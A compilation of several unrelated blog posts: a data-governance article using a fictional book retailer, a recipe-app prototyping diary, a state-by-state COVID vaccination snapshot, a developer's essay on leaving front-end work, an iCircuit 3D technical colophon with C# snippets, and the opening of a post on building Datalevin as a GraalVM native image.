<p>Machine Learning has the capability to transform all aspects of business, from recommending products to your customers, optimising call routing in your call centre through to segmenting marketing messages. As organisations become more reliant on these technologies, they are more likely to incorporate them deeper into their processes leaving them vulnerable to prickly edge cases. Machine learning fails are already well-publicised, from<a href="https://www.reuters.com/article/us-amazon-com-jobs-automation-insight-idUSKCN1MK08G" rel="nofollow"> sexist recruitment AI at Amazon</a>, or <a href="https://twitter.com/geraldmellor/status/712880710328139776?lang=en" rel="nofollow">Microsoft’s AI Twitter Bot “Tay” who lasted less than 24 hours before going full racist.</a></p>
<p>Automation, especially when combined with Machine Learning makes organisations more efficient and more scalable. Marketing Automation provides marketers with super-powers to deliver the right message to the right customer at the right time. However, when automation fails (often due to errors in data), the problems are amplified – as one mistake can set off a chain of events that can destroy organisations.</p>
<h2 id="Introduction"><span>Introduction</span></h2>
<p>To help illustrate the importance of Data Governance, we will use a fictional company, which has run into an equally fictional set of challenges. Forrest Corp, is an online book retailer with approximately 100 staff, based in Melbourne, Australia. As with many organisations of this size, Forest Corp has functional teams responsible for Marketing, Finance, Technology, Customer Service and Operations. Forrest Corp has been wildly successful, with sales exploding throughout COVID-19 lockdowns.</p>
<p><strong>The problem</strong></p>
<p>The executive team is very displeased that gross margins and profitability have deteriorated sharply, and that their personal (managed) Instagram feeds are blowing up with negative messages. They want answers! In speaking with leaders from different teams, they receive mixed messages:</p>
<ul><li>Marketing is excited to show a 10% increase in sales due to a Social Media Influencer campaign and finds it difficult to believe things are as bad as they are made out to be</li><li>Finance says sales are flat, with rising inventories, shipping costs and customer retention costs hurting margins and profitability</li><li>Customer service is inundated with complaints, but they feel they have it under control using their existing policies and procedures</li><li>Operations confirm the increase in sales, but their team is overworked in dealing with the influx of sales and a large number of returns.</li></ul>
<p>An analysis by an external analytics consultancy begins to unravel the story:</p>
<ul><li>The Marketing team recently established a new Social Media Influencer program, enabling influencers to sign up to earn referral commissions on books they recommend. </li><li>A very popular Social Media Influencer has recommended a particular book to their large follower base</li><li>The rapid increase in sales of the book have impacted the company’s recommendation model, leading to it being recommended to a much wider audience of customers</li><li>It turns out that the Social Media Influencer has misrepresented the book leading to a high rate of return from dissatisfied customers</li><li>In order to placate angry customers, customer Service follows its procedure of sending gifts to aggrieved customers, as recommended by their recommendation engine.</li><li>The gifts only inflame the situation, infuriated customers are often sent the same book as they initially returned.</li></ul>
<p>How could this all happen?</p>
<h2 id="Data-Governance">A failure of <span>Data Governance</span></h2>
<p>The <a href="https://datagovernance.com/">Data Governance Institute</a> defines data governance as “a system of decision rights and accountabilities for information-related processes, executed according to agreed-upon models which describe who can take what actions with what information, and when, under what circumstances, using what methods.”</p>
<p>Data governance is often formally practised in large organizations, but many of the concepts are applicable to all organisations seeking to utilise data in decision making.</p>
<p>In Forest Corp’s case, a series of failures in the way it collects, manages and utilizes data led to the cascading problems illustrated above.</p>
<h2 id="Data-Quality">Data Quality</h2>
<figure><img loading="lazy" width="1024" height="372" src="https://growingdata.com.au/wp-content/uploads/2021/02/DataQualitySkyscraper_Fig2-01-1024x372.png" alt="" srcset="https://growingdata.com.au/wp-content/uploads/2021/02/DataQualitySkyscraper_Fig2-01-1024x372.png 1024w, https://growingdata.com.au/wp-content/uploads/2021/02/DataQualitySkyscraper_Fig2-01-300x109.png 300w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Data Quality Foundations <a href="https://profisee.com/data-quality-what-why-how-who/" target="_blank" rel="noreferrer noopener">Image credit</a></figcaption></figure>
<p>Data quality is the foundation for all analytics and machine learning. As organisations seek to make more decisions on the basis of data, there is a real risk that decisions can be made incorrectly if the data underpinning them is incorrect, incomplete or inconsistent.</p>
<p>A key failure for Forest Corp’s marketing team was in its lack of screening of Influencer’s past histories. Social Media Influencers could sign up for their affiliate program easily, with critical pieces of information collected without any verification.</p>
<p>In the Forest Corp example, when the Marketing team’s analytics began showing the success of one affiliate code they immediately looked up the influencer behind it. Unfortunately, the URLs behind the profile were unusable. No data was supplied for their Twitter and Facebook handles, and their supplied Instagram handle didn’t actually exist. While contact information was provided, emails and phone calls went unanswered. So the Marketing Team was faced with a challenging scenario – their Social Media Influencer program is clearly generating sales but they are blind as to the content triggering it or the person behind it.</p>
<p>If data is captured incorrectly, it is often difficult or impossible to correct it. Worst of all though is that it’s only when an organisation <em>really</em> needs high-quality data that they realise it was never collected properly. In the Forrest Corp example, they were blind to a massive spike in sales attributable to a single affiliate without any way to tie it back to.</p>
<h3 id="Data-Quality-Recommendations">Data Quality Governance Recommendations</h3>
<h4 id="Incentivise-data-quality-at-the-point-of-collection">Incentivise data quality at the point of collection</h4>
<p>Digging deeper into the sign-up process for affiliates, it was discovered that the affiliate systems were built quickly following a mandate from the Executive Team to get the system up and running prior to a major holiday. Additionally, the Marketing Manager’s key KPI’s for the quarter were the number of onboarded affiliates, as well as the sales volume generated by affiliates. The problems with the affiliate signup process was a product of these incentives.</p>
<p>The time pressure to build the onboarding system meant that the initial design could not be implemented in its entirety. As Product Owner, the Marketing Manager had to prioritize which features would make the initial version, and which would be delayed to a future version. Automated verification of affiliates was seen as a large piece of work and thought to add friction to the signup process potentially hurting the Marketing Managers KPIs. It was therefore easy for the Marketing Manager to de-prioritise this feature of the onboarding system.</p>

<ul><li>Key Performance Indicators that create disincentives for data quality should be avoided.</li><li>Analyse and understand the unintended consequences of performance metrics on data quality</li><li>Incorporate data quality metrics into KPI’s for Product Owners whos products involve data capture</li></ul>
<h4 id="Projects-that-involve-data-collection-require-oversight-and-guidance,-and-periodic-review">Projects that involve data collection require oversight and guidance, and periodic review</h4>
<p>Without a process of oversight in how data was captured, the Marketing Manager was free to make decisions that ultimately caused the misleading Influencer to speak fraudulently on behalf of their organisation. However, the Marketing Manager is rightly focussed on Marketing, not issues of Data Governance. An organisation can’t and shouldn’t expect all its managers to be Data Governance experts.</p>

<ul><li>A Data Governance Council should provide advice on issues relating to how projects are implemented and the potential costs and risks of different implementations.</li><li>Data quality metrics should be established with any project that involves data capture</li><li>A Data Governance Council should periodically review or audit key systems to see how they are actually being used and assess the quality of the data they capture.</li></ul>

<p>Equally, in designing the affiliate sign-up form, the Marketing Team failed to understand the pressures on Social Media Influencers. One of these pressures is the need to sign up to a <em>lot</em> of affiliate programs, and the fact that time spent signing up to affiliate programs is time not spent building their brand and following. The Forrest Corp Affiliate Signup process, while failing to verify key information, also asked for a lot of information much of which seemed fairly unimportant to them getting paid. Therefore a lot of fields were left blank, even critical ones.</p>

<p>Data entry is often the least enjoyable aspect of a process., but is of critical importance. Systems that collect data need to be user friendly and easy to use. Here are a few principles:</p>
<ul><li>Make use of “pick lists” or “autocomplete” to make it easy to link data</li><li>Make it easy to identify existing entities to reduce the risk of creating duplicate entries</li><li>Avoid requiring too many fields, or …</li></ul></div></div></div></div></article></div>

                    <p>Last week started with the ambitious goal of adding 10 recipes from various cookbooks into Hey Chef. I thought it'd be a good opportunity to "eat my own dog food" and test the Add Ingredient UI.</p><p>Well, 2 recipes and 3 pages of notes later, I gave up.</p><h2 id="mistakes-i-ve-made-a-few">Mistakes, I've made a few</h2><p>I thought if I covered quantity, measurement and ingredient names I could add <em>most</em> recipes to the app. It turns out, even these simple pieces of information can have hidden gotchas.</p><p>I made assumptions such as "ingredients always have a quantity and measurement" &nbsp;<em>(spoiler: they don't) and</em> jumped from design to development without user testing.</p><p>If I wanted to deliver a great user experience, I'd have to dive deep on ingredients and find issues with my UI <em>before </em>development. Enter prototyping.</p><h2 id="what-s-a-prototype">What's a prototype?</h2><p>Prototypes are lightweight versions of your product, designed to highlight usability and flow issues prior to development. Although they <em>can</em> involve code, they typically range from sketches on paper to interactive design files. Development is expensive and prototyping saves time by discovering problems early in the design process.</p><h2 id="add-ingredient-v2">Add Ingredient v2</h2><p>I made this interactive prototype and set myself a new goal of "share it with 5 users and find problems early."</p><p>The clip below is of the design <em>after</em> feedback, but I'll go into the issues I discovered in my user testing sessions and why ingredients aren't as simple as the seem.</p><figure><img src="https://markrobinson.blog/content/images/2021/02/HeyChefAddIngredient.gif" alt=""><figcaption>New and improved Add Ingredient UI. This prototype is purposely designed in grey scale to focus on interactions over design.</figcaption></figure><h2 id="ingredients-are-complicated">Ingredients are complicated</h2><figure><img src="https://markrobinson.blog/content/images/2021/02/Ingredient-Complexity.jpg" alt="" srcset="https://markrobinson.blog/content/images/size/w600/2021/02/Ingredient-Complexity.jpg 600w, https://markrobinson.blog/content/images/size/w1000/2021/02/Ingredient-Complexity.jpg 1000w, https://markrobinson.blog/content/images/2021/02/Ingredient-Complexity.jpg 1500w" sizes="(min-width: 720px) 720px"><figcaption>Example of how an ingredient sentence can quickly become more complex.</figcaption></figure><p>Ingredients can range from a simple list of names and measurements to complex sentences containing descriptions, alternatives and preparation advice. They aren't always consistent in their sentence structure, and can vary wildly from source to source.</p><p>I've found 4 main categories of information that can be included in ingredient lists.</p><h3 id="quantity">Quantity</h3><blockquote><em>extra virgin olive oil</em></blockquote><p>Ingredients always have a quantity, until they don't. Sometimes recipes will just say "olive oil." As in, olive oil will be used at some point, in some quantity but I'm not telling you how much.</p><p>The strange thing is, the recipe will usually say in the method somewhere to add "1 tablespoon of olive oil." Just put that in the ingredients then!</p><p>I've decided that Hey Chef will always require a quantity. It'll make development of features like "Shopping Lists" easier and keep data consistent. </p><h3 id="not-every-ingredient-has-a-measurement">Not every ingredient has a measurement</h3><figure><img src="https://markrobinson.blog/content/images/2021/02/Optional-Measurements.jpg" alt="" srcset="https://markrobinson.blog/content/images/size/w600/2021/02/Optional-Measurements.jpg 600w, https://markrobinson.blog/content/images/size/w1000/2021/02/Optional-Measurements.jpg 1000w, https://markrobinson.blog/content/images/2021/02/Optional-Measurements.jpg 1500w" sizes="(min-width: 720px) 720px"><figcaption>Old UI vs New Design. User can add extra pieces information about their ingredient. Measurements and Preparations are the current options, but more on that later.</figcaption></figure><p>Ingredients are often written without a measurement. For example, "4 spring onions." That's ok spring onions, you're good just the way you are.</p><p>In the old UI, the user always had to add a measurement, otherwise the "Add Ingredient" button would be disabled. Now, the user can just tap "Done" and save the ingredient without one.</p><p>I did have issues in user testing with people not <em>always</em> seeing the option to add a measurement, so I might have to revisit that UI in future.</p><h3 id="custom-measurements">Custom Measurements</h3><figure><img src="https://markrobinson.blog/content/images/2021/02/Custom-Measurements.jpg" alt="" srcset="https://markrobinson.blog/content/images/size/w600/2021/02/Custom-Measurements.jpg 600w, https://markrobinson.blog/content/images/size/w1000/2021/02/Custom-Measurements.jpg 1000w, https://markrobinson.blog/content/images/2021/02/Custom-Measurements.jpg 1500w" sizes="(min-width: 720px) 720px"><figcaption>Smart measurement suggestions for "bacon." Suggestions change depending on the ingredient added.</figcaption></figure><p>Certain foods have measurements specifically associated with them. You can't have a knob of bacon but you can have a knob of butter.</p><p>I've added a "smart toolbar" above the keyboard that shows measurement suggestions based on the ingredient added.</p><p>Originally, the user could only select from the suggested measurements, but after user testing I discovered people wanted to type. Now, the suggestions will update as the user types and if the app can't find it, the user can add their own custom measurement.</p><h3 id="descriptions">Descriptions</h3><blockquote><em>"120g of <strong>firm</strong> white fish", "3 <strong>mixed-colour</strong> peppers", "1-2 <strong>fresh</strong> red chillies"</em></blockquote><p>These are words that aren't the ingredient but describe something about them. I include colour in the ingredient name and don't consider it a description. For example, "red onion" is an ingredient - it's not an onion that is red.</p><p>They're useful, but I'll add them later in Add Ingredient v3, the app is still usable without descriptions.</p><h3 id="preparation-info">Preparation Info</h3><figure><img src="https://markrobinson.blog/content/images/2021/02/PreparationSuggestions.jpg" alt="" srcset="https://markrobinson.blog/content/images/size/w600/2021/02/PreparationSuggestions.jpg 600w, https://markrobinson.blog/content/images/size/w1000/2021/02/PreparationSuggestions.jpg 1000w, https://markrobinson.blog/content/images/2021/02/PreparationSuggestions.jpg 1500w" sizes="(min-width: 720px) 720px"><figcaption>An Ingredient can have common preparation advice specific to itself. The above is an example for "rice." Hey Chef will auto suggest these depending on the ingredient.</figcaption></figure><blockquote><em>"2 red onions, <strong>diced</strong>", "1 cup rice, <strong>washed</strong> and <strong>drained</strong>"</em></blockquote><p>Recipes will often describe how an ingredient should be prepared in the ingredient section instead of the method. When this happens, the method <em>usually</em> has vague steps like "sweat the onion in the frying pan."</p><p>I don't want someone chucking a whole onion in a frying pan because I didn't add preparation information. I'm kidding, but recipes wouldn't be useable without it.</p><h2 id="what-s-next">What's next?</h2><figure><img src="https://markrobinson.blog/content/images/2021/02/Issues-Summary-After.jpg" alt="" srcset="https://markrobinson.blog/content/images/size/w600/2021/02/Issues-Summary-After.jpg 600w, https://markrobinson.blog/content/images/size/w1000/2021/02/Issues-Summary-After.jpg 1000w, https://markrobinson.blog/content/images/2021/02/Issues-Summary-After.jpg 1500w" sizes="(min-width: 720px) 720px"><figcaption>The top 3 are solved and descriptions are a later problem.</figcaption></figure><p>Now that I have an "Add Ingredient" experience I'm happy with, I'm going to write it in code over the next couple of weeks.</p><p>I've found blog posts take considerably longer to write than I originally thought, so I'm aiming to do 2-3 week cycles of development, design and user research followed by a cycle of writing and marketing.</p><p>If I don't write as frequently, that's why - It's not that there isn't progress being made.</p><h3 id="how-do-you-find-new-recipes">How do you find new recipes?</h3><p>In my user testing sessions I asked the participants questions on how they researched new recipes, did their shopping and daily cooking habits. I found some fascinating insights that are going to change the priorities of Hey Chef, but that's for next time... 😉 </p><p>Yep, a cliffhanger 🧗‍♀️</p><p>👋</p>

      <p>It's been a little over a year since COVID-19 hit US soil. Now, we're witnessing the biggest vaccination campaign in history.</p>
<p>At least 49 million vaccine doses have been distributed across America, and at least 29 million doses of vaccine have been administered, according to the US Centers for Disease Control and Prevention. That means 24 million people have received at least one dose of the vaccine,&nbsp;but only about 5.25 million people have been fully vaccinated, according to CDC data.&nbsp;</p>
<p>At the time of writing, Alaska has <a href="https://www.businessofbusiness.com/articles/covid-vaccine-tracker-data-west-virginia-connecticut-best-states/">vaccinated the highest percentage of its state population</a>. The first dose of the vaccine has been administered to 13.4% of Alaskan residents.&nbsp; West Virginia follows close behind with 10.9% of its population vaccinated. Still, most of America is unvaccinated.</p>
<p>Currently, Idaho has&nbsp;administered the first dose to&nbsp;the lowest percentage of its population out of all 50 states. 6% of Idaho residents have been given thee first dose. Missouri and Iowa are moving at the second and third slowest pace with 6.1% and 6.3% of their populations having received the first dose, respectively.</p>
<p>Press the play button on the chart below to see how the stats change over time.&nbsp;</p>

<p>Out of the eight slowest states, half of them are located in the Midwest. Two of them are in the South. This is a shift from late January. California, Nevada, Wisconsin, and Illinois were among the states with the most lag. Alabama was in last place, with only 2.9% of its population partially vaccinated. With the exception of Alabama and Illinois,&nbsp;these states managed to pick up the pace and improve their rankings.&nbsp;</p>
<p>10.3% of the US population has been vaccinated at the time of writing. This data will be updated daily.</p>
      

      
      <h3>About the Data:</h3>
      <p>
        Thinknum tracks companies using the information they post online, jobs, social and web traffic, product sales, and app ratings, and creates data sets that measure factors like hiring, revenue, and foot traffic. Data sets may not be fully comprehensive (they only account for what is available on the web), but they can be used to gauge performance factors like staffing and sales.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>I started coding when I was 14, around 2007 or so. The very first thing I wrote was HTML, then CSS. I liked
making stupid little web pages containing youtube embeds and guest books (anyone remembers those?) full of
<a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/marquee">marquees</a>, <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/blink">blinks</a>
and gifs. Lots of gifs. The pages were very simple, but joyful to make and also to use. At the time I had no idea that
you could make any money with making web pages, I simply thought it was a silly hobby people could have.</p>
<p>Fast-forward 3 years I got my first few gigs as a web developer. By then I was pretty good at HTML and CSS already,
had dabbled enough with PHP to know my way around of most sticky problems I would find myself in and while I didn't
really know much of vanilla JavaScript, it was okay, because everyone used almost exclusively <a href="https://jquery.com/">jQuery</a> anyway. Yet still,
the websites were rather simple and joyful to make.</p>
<p>It was easy to get started, too - you just created the files and refreshed the page. HTML? PHP? JavaScript? Just create the
file and save it, then refresh the browser. Rinse and repeat until you are happy with the result. But then, almost
out of nowhere, something changed. At first, it came slowly and before it could even speed up, it was already here.
<strong>The complicated web was here</strong>.</p>
<p>Nowadays I make a living mainly with JavaScript and TypeScript using React.js as a front-end framework. That's right,
front-ends are so complex they now need frameworks to be able to manage their seemingly infinite component hierarchies.
JavaScript no longer is liked by the community, so the community created a poor man's version of a typed language which
duct-tapes around an <a href="https://whydoesitsuck.com/why-does-javascript-suck/">already poorly made language</a>. </p>
<p>Starting a new project? Make sure to write your project idea down because by the time you are finished setting up the vast
boilerplate you have probably forgotten it. Vast boilerplate? Oh yeah, you better set-up your project with <a href="https://www.typescriptlang.org/">TypeScript</a>,
<a href="https://eslint.org/">ESlint</a>, <a href="https://webpack.js.org/">Webpack</a> and <a href="https://babeljs.io/">Babel</a>, because
if you don't then obviously you haven't learned anything since 2005 and suck. Don't have <a href="https://www.npmjs.com/">NPM</a>? Better install that, too,
because nobody installs libraries without a package manager anymore. Oh and while you're at it, install also <a href="https://yarnpkg.com/">Yarn</a>,
because why not make use of two package managers at the same time. <em>Phew</em>, you did all that? Damn, that's commitment!
You can finally write what is essentially just HTML and JavaScript!</p>
<p>Now, don't forget we also want to style our project, but if you thought you could get away with writing good ol' CSS,
you were wrong. We no longer write CSS, because it's lame. We now write <a href="https://sass-lang.com/">SCSS</a> instead,
so that we could write dynamic stylesheets that convert to CSS, because <a href="https://hospodarets.com/you-might-not-need-a-css-preprocessor">of course 99% of the web needs that</a>. </p>
<p>But enough of the hating. If I wanted I could hate on anything most likely, and the web has come a long way since 2007,
in lots of good ways, and I don't want to discredit that. I suppose with the increase of complexity in what we want to
achieve on the web the stack to achieve it with has had to also increase in complexity. For me, personally, it's
too much. I want to have a personal life and not have to spend my nights reading up on some new flavour of *.js in
fear that if I don't I would soon be made irrelevant. I don't want to learn nor use a million different tools. I don't want
to know a bit about everything and a lot about nothing. </p>
<p>Thus, I don't want to do front-end development anymore. The joy is gone. I've given in my resignation at my current place of
employment and will be seeking an exclusively back-end role for my next adventure, starting April. The language doesn't
matter much to me, I know enough of them to know that they are all very similar and thus easy enough to learn. If you know of a
good opportunity, <a href="mailto:asko@askonomm.com">let me know</a>.</p></div></div>]]>

  <div itemprop="articleBody">
    <p>Today I’m pleased to announce the <a href="https://apps.apple.com/us/app/icircuit-3d/id1539977373">macOS release of iCircuit 3D</a>! Last week I released the iOS version to a wonderful reception and I’m happy to now be able to give all the Mac users out there the same experience. iCircuit 3D has been a work of passion over the last couple years and I thought I would take a moment to describe some of the more interesting technical aspects of it.</p>

<p>So here is a very extended colophon for the app. Maybe you can get some ideas for your next app from it!</p>

<p><a href="https://praeclarum.org/images/2021/icircuit3d.jpg"><img src="https://praeclarum.org/images/2021/icircuit3d.jpg" alt="iCircuit 3D showing switches and LEDs"></a></p>

<h2 id="programming-language-and-style">Programming Language and Style</h2>

<p>iCircuit 3D is written 100% in C# using Xamarin.iOS and Xamarin.Mac. I started with C# 7 but C# 9 had already been released by the time I shipped the app. :-) The null reference checking feature of C# 8 has been especially useful in tracking down bugs.</p>

<p>The app is very object oriented. In fact, this may be the largest OOP app I’ve ever built. This is funny considering that I am quite an advocate for functional programming and more reactive style UI design these days. But react style programming of a real-time engine like this is not trivial and I found myself trailblazing a bit more than I like. Like it or hate it, OOP is well understood at this point.</p>

<p>I decided to go OOP, in some ways, to rid myself of writer’s block too. I’ve been writing OOP programs since the 1990s and I am very comfortable with the abstraction and patterns. Sometimes when you’re stuck, the best thing to do is to lean into your strengths.</p>

<h3 id="properties-ftw">Properties FTW</h3>

<p>A mental road block I often run into when starting a new app is how to handle serialization and undo buffers. I decided to solve both problems in a generic way that would require very little on-going work. The key was to base both undo and serialization on properties of objects.</p>

<p>Serialization is a simple process thanks to advanced libraries like <a href="https://www.newtonsoft.com/json">Newtonsoft.Json</a>. I’m able to serialize and restore entire object graphs (thanks to its object reference handling) and only have to be careful that I don’t serialize more than I need to. I also chose to use the BSON serialization format so that the app could handle binary data more efficiently. (Circuits can contain binary data thanks to image and board import facilities.)</p>

<p>The undo (and redo) system of the app is based on property changes. When a property changes, an undo change event is registered with the OS (Apple has <code>NSUndoManager</code>). That event captures the property’s value before and after the change. When the user undos and redos, the system just has to figure out which of those values to restore to the property.</p>

<p>All of this is achieved with property definitions such as this:</p>

<div><div><pre><code><span>public</span> <span>class</span> <span>Resistor</span> <span>:</span> <span>CircuitElement</span> <span>{</span>
    <span>double</span> <span>resistance</span> <span>=</span> <span>1000</span><span>;</span>
    <span>[</span><span>Inspector</span> <span>(</span><span>Units</span> <span>=</span> <span>"Ω"</span><span>,</span> <span>Min</span> <span>=</span> <span>0</span><span>,</span> <span>Max</span> <span>=</span> <span>1</span><span>e12</span><span>)]</span>
    <span>public</span> <span>double</span> <span>Resistance</span> <span>{</span>
        <span>get</span> <span>=&gt;</span> <span>resistance</span><span>;</span>
        <span>set</span> <span>=&gt;</span> <span>SetUndoableProperty</span> <span>(</span><span>ref</span> <span>resistance</span><span>,</span> <span>value</span><span>,</span> <span>()</span> <span>=&gt;</span> <span>{</span>
            <span>InvalidateMaterial</span> <span>();</span>
            <span>InvalidateAnalysis</span> <span>();</span>
        <span>});</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>The trick is to call <code>SetUndoableProperty</code> which is very similar to the MVVM helpers standard <code>SetProperty</code>. It checks if the value actually did change, and, if so, calls an inline change handler (this example invalidates some things) and triggers the <code>PropertyChanged</code> event. <code>SetUndoableProperty</code> takes just one extra step and registers that change with an undo manager. I found that you want to be explicit about what gets registered with the undo manager because not all properties are set by users and don’t need to be registered. That’s all that’s needed for me to get serialization, undo support, and inspector UI support (thanks to reflection).</p>

<p>If you adopt the pattern of default object constructors and properties that can change any time, you can get these cross-cutting features essentially for free. I love how much power can be put into a single property.</p>

<p>I’ve talked about this a bit more on Merge Conflict over the last couple years. (Gosh I’ve been working on this app for awhile.) Give them a listen if you’re interested in details!</p>





<h3 id="lots-of-multithreading">Lots of Multithreading</h3>

<p>My biggest gripe with OOP is its inability to handle shared-memory multi threading. And, honestly, the style basically guarantees your code will have race conditions. In iCircuit 3D there are 4 kind of threads that all have to interact with each other:</p>

<ol>
  <li>The main UI thread is responsible for drawing the 2D UI and handling user interactions</li>
  <li>The 3D render thread is responsible for drawing the environment (one for each view)</li>
  <li>The electronics simulation thread, well, simulates things</li>
  <li>The background threads that perform the operations that are too slow to perform on the other 3 threads</li>
</ol>

<p>In other words, there is a lot to synchronize in a mutation heavy environment.</p>

<p>I ended up using .NET’s monitor-based locking primitive <code>lock (thing) { }</code> to do fine grained locks over critical data structures. From my past experience writing multithreading-heavy apps, I knew that the lock primitive was very efficient. Not safe, but efficient. ;-)</p>

<p>Safety came from designing thread-safe interfaces to objects and being very strict with myself in how callbacks are executed. The nemesis of locking is deadlocks. Deadlocks are usually caused by holding a lock while executing unknown code (from a callback, an enumerable, or an event). I sacrificed a little performance for stability by ensuring I only held locks while executing code that I was sure was callback and recursion free. It’s hard sometimes but the benefits of having thread safe code are innumerable. Also, the good news is that deadlocks are actually easier to debug than race conditions. If the app deadlocks, pause it, find what every thread is blocking on, slap yourself on the wrist, and fix the code.</p>

<p>I’m sure there are race conditions galore in the app, but multithreading bugs just have not been an issue… usually… But it takes diligence.</p>

<h3 id="apple-only">Apple Only</h3>

<p>While C# and .NET certainly lend themselves to cross-platform code, I decided to focus primarily on Apple APIs.</p>

<p>In order to make progress on the app, I abandoned cross-platform support and focused on leveraging the magnificent Apple APIs. This was a great decision. Before I made this decision, I would have to consider how to do fancy things on 3 different platforms. Easy stuff is easy, but hard stuff (like 3D renderers) are, well, hard. Focusing on one platform made the app better because I could optimize that experience without spreading my time out across platforms.</p>

<h2 id="the-3d-renderer">The 3D Renderer</h2>

<p>The main user interface is a 3D environment powered by Apple’s SceneKit technology. SceneKit is basically a game engine built into every version of iOS and macOS. I love it because it is both feature rich and performant. I’m continually impressed by it being able to handle whatever I throw at it (within reason of course) and continually getting graphics improvements.</p>

<p>Some features I take heavy advantage of include:</p>

<h3 id="thread-safety">Thread Safety</h3>

<p>Apple was kind enough to make SceneKit thread safe. This means I can usually access it from whatever thread I want. I did notice, however, that there are some race conditions if you don’t execute your code in SceneKit’s transactions. It’s not hard, you just have to make sure to write:</p>

<div><div><pre><code><span>SCNTransaction</span><span>.</span><span>Begin</span> <span>();</span>
<span>try</span> <span>{</span>
    <span>// Code that does SceneKit things</span>
<span>}</span>
<span>finally</span> <span>{</span>
    <span>SCNTransaction</span><span>.</span><span>Commit</span> <span>();</span>
<span>}</span>
</code></pre></div></div>

<p>whenever you want to manipulate rendered objects. With that pattern I could confidently manipulate the scene graph from whatever thread I wanted.</p>

<h3 id="physically-based-rendering">Physically Based Rendering</h3>

<p><a href="https://praeclarum.org/images/2021/icircuit3d_battery.jpg"><img src="https://praeclarum.org/images/2021/icircuit3d_battery.jpg" alt="iCircuit 3D rendering of a battery"></a></p>

<p>PBR is the new hotness if real-time realistic-looking rendering. It’s actually a technology developed for movies to make visuals look less, well, plasticky and now I’m able to run it on my phone. Amazing.</p>

<p>PBR requires that you provide three textures for every object: its color, its roughness, and its metalness. You can imagine what color does. Roughness lets you control how rough or shiny an object is and metalness controls the color of light reflected off the object. The fact that you can vary these levels on a pixel-per-pixel level enables a lot of nice effects. This is most notable on AA batteries who have a diffuse body, a shiny metallic stripe, then dull metallic contacts. That’s all done using a real-time generated texture.</p>

<h3 id="led-lights">LED Lights</h3>

<p>Once you have a good lighting model, you need some good lights. I decided to make every LED a light source. This actually overwhelms SceneKit because it has a maximum of 8 light sources, but things are pretty fun up until that point. This is a short section, I just thought the LED lights were fun. :-)</p>

<h3 id="skeletal-meshing-for-wires">Skeletal Meshing for Wires</h3>

<p><a href="https://praeclarum.org/images/2021/icircuit3d_wires.jpg"><img src="https://praeclarum.org/images/2021/icircuit3d_wires.jpg" alt="Triangles of a wire"></a></p>

<p>One fun feature of iCircuit 3D is that its wires arc around the environment like real wires. I am using skeletal meshing, a technology that is usually used for character movement in games, to accomplish this.</p>

<p>I use a 3D Bézier curve that starts by matching its direction to the port it’s attached to. It then travels in a direction towards the other object and then finally curves again to meet that objects’ port. It’s a lot of math to figure out (shout out to <a href="http://calca.io/">Calca</a> for helping me) but really adds some pizzaz to the app. I move skeletal control points to lie on that curve and then allow SceneKit’s code to move the geometry of the wire to match that skeleton.</p>

<h3 id="environment-maps">Environment Maps</h3>

<p><a href="https://praeclarum.org/images/2021/icircuit3d_env.jpg"><img src="https://praeclarum.org/images/2021/icircuit3d_env.jpg" alt="A reflection of the environment"></a></p>

<p>PBR only looks good if you give it a nice environment. A friend and I spent an evening in a craftsman’s workshop taking photography to light this app using a cheap 360 degree camera. Then Wilderness Labs’ Bryan Costinach let me take photos of his lab to add some variety to the app. To add a bit more user control I also added SceneKit’s sky generator that tracks the current time of day, and users can select their own colors.</p>

<h3 id="custom-shaders">Custom Shaders</h3>

<p>SceneKit has some beautiful light rendering, but sometimes you want to take control. The API makes this easy by being able to inject little shader snippets into each model by assigning a string to a material property. As someone who has been writing and using 3D renderers their whole career, this is an …</p></div></article></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                
                <p>One of the latest fashions in the Java world is <a href="https://www.graalvm.org/">GraalVM</a>. For someone who has been around, I still remember the "Write once, run anywhere" slogan of Java virtual machine. Apparently, the wheel has spun back, now people want to write native code in Java, which has to be compiled to different machine codes in different platforms. </p>
<p>The driving forces for this change may include the often lamented slow startup time of Java programs. For the brave new world of serverless functions, a quick starting program makes a lot of economic sense. The small but vibrant <a href="https://clojure.org/">Clojure</a> community, which I consider myself a part of, is particularly excited about this new found capability of JVM, for we now have one more way to write quick starting command line programs using our beloved language. The other way is to use ClojureScript on one of the Javascript engines, but Javascript engines are slower than JVM and are not as nice. For example, <a href="https://github.com/babashka/babashka">Babashka</a> is one such example that has taken the community by storm. </p>
<p>As the author of <a href="https://github.com/juji-io/datalevin">Datalevin</a>, a relatively new open source Datalog database, I have decided to answer the users' call for a native version of Datalevin using GraalVM native image technology. After some trials and errors, I have gotten a native version of Datalevin to pass all the tests. Now I can share some experience.</p>
<h2>Failed attempts to compile Datalevn to native image</h2>
<p>The difficulty of directly compiling Datalevin to GraalVM native image lies in our use of <a href="https://github.com/jnr/jnr-ffi">JNR</a> library to wrap <a href="https://en.wikipedia.org/wiki/Lightning_Memory-Mapped_Database">LMDB</a>, the underlying key-value store that is written in C. As far as I know, no one has succeeded in getting JNR to work with native image. This is not for the lack of trying, see for example <a href="https://github.com/borkdude/datalevin-native">this effort</a> and <a href="https://github.com/oracle/graal/issues/675">this issue</a>. I myself have tried really hard. Although I think I have gone further than many, the need to rerun some class initialization at runtime prevented me from succeeding. Apparently, some GraalVM team members also think it is not easy to do at this point.</p>
<p>I am left with two options: one is to use a different LMDB wrapper that does not use JNR. For example, a <a href="https://github.com/deephacks/lmdbjni">JNI based LMDB wrapper</a> is available and GraalVM native image does support JNI. However, that code has not been updated for a long time and its maintainer seems to have joined <a href="https://github.com/lmdbjava/lmdbjava">LMDBJava</a>, the LMDB wrapper that uses JNR. The other option is to write a LMDB wrapper of my own that can run in native image. So I <a href="https://github.com/juji-io/datalevin/tree/master/native">did just that</a>.</p>
<h2>Writing C code in Java/Clojure</h2>
<p>As a native technology, GraalVM obviously has the facility to interface with C code. Not just that, it must also have the facility to write native code on its own. Fortunately, such facility is also packaged as a SDK that is publicly available. To use this SDK, one has to be familiar with not just Java, but also C programming, because effectively, it is writing low level C code in Java syntax. </p>
